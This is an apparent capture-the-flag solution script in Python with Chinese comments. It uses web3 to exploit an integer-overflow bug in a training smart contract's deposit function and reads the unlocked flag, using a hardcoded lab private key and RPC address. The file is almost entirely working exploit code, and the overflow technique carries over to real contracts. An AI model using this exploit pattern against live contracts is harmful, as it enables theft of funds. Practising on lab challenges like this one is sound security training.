from web3 import Web3

# 1. 連線至以太坊節點
rpc_url = 'http://chatelaine.cylabacademy.net:40813'
w3 = Web3(Web3.HTTPProvider(rpc_url))

# 2. 填入從題目截圖獲得的私鑰與合約地址
private_key = (
    '0x7ddcf0fece9ae60d56af5dedaabb62d79bc00269f0900b76c65449cb6e8e9153'
)
contract_address = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9'

account = w3.eth.account.from_key(private_key)
my_address = account.address

# 3. 合約 ABI
abi = [
    {
        'inputs': [{'internalType': 'uint256', 'name': 'amount', 'type': 'uint256'}],
        'name': 'deposit',
        'outputs': [],
        'stateMutability': 'nonpayable',
        'type': 'function',
    },
    {
        'inputs': [],
        'name': 'getFlag',
        'outputs': [{'internalType': 'string', 'name': '', 'type': 'string'}],
        'stateMutability': 'view',
        'type': 'function',
    },
    {
        'inputs': [],
        'name': 'revealed',
        'outputs': [{'internalType': 'bool', 'name': '', 'type': 'bool'}],
        'stateMutability': 'view',
        'type': 'function',
    },
]

contract = w3.eth.contract(address=contract_address, abi=abi)

print(f'操作帳戶: {my_address}')
print(f'當前合約是否已解鎖: {contract.functions.revealed().call()}')

# 4. 步驟一：先存入一小筆金額 (例如 10)
print('正在進行第一次存款 (10)...')
nonce = w3.eth.get_transaction_count(my_address)
tx = contract.functions.deposit(10).build_transaction({
    'from': my_address,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce,
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)
print('第一次存款成功！')

# 5. 步驟二：利用整數溢位觸發條件 (2**256 - 5)
overflow_amount = 2**256 - 5
print('正在進行溢位存款觸發 Flag...')
nonce = w3.eth.get_transaction_count(my_address)
tx2 = contract.functions.deposit(overflow_amount).build_transaction({
    'from': my_address,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce,
})
signed_tx2 = w3.eth.account.sign_transaction(tx2, private_key=private_key)
tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash2)
print('溢位交易已送出！')

# 6. 檢查是否成功解鎖並取得 Flag
is_revealed = contract.functions.revealed().call()
print(f'合約解鎖狀態: {is_revealed}')

if is_revealed:
  flag = contract.functions.getFlag().call()
  print(f'成功取得 Flag: {flag}')
else:
  print('尚未解鎖，請確認交易狀態。')
